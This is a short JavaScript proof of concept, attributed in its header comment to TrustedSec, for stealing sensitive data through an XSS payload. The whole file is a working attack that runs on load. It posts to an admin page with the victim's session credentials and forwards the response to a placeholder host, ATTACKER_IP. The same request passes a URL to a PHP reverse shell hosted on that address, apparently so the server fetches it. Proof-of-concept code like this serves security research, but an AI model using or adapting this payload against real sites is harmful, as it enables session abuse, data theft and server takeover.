// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload


function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}

function stealData()
{
	var uri = "/harm/to/self/admin.php";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
			if (xhr.status === 200) {
			var responseData = xhr.responseText;
            var forwardXhr = new XMLHttpRequest();
            forwardXhr.open("POST", "http://ATTACKER_IP/collect", false);
            forwardXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            forwardXhr.send("leaked_data=" + encodeURIComponent(responseData));
            // Do something with the response
			} else if (xhr.status != 200) {
				var forwardXhr = new XMLHttpRequest();
				forwardXhr.open("GET", "http://ATTACKER_IP/nothing", false);
				forwardXhr.send(null);
			}
		}
	};

    var data = `url=http://ATTACKER_IP/f/php_reverse_shell.php`
	xhr.send(data);
}

stealData();
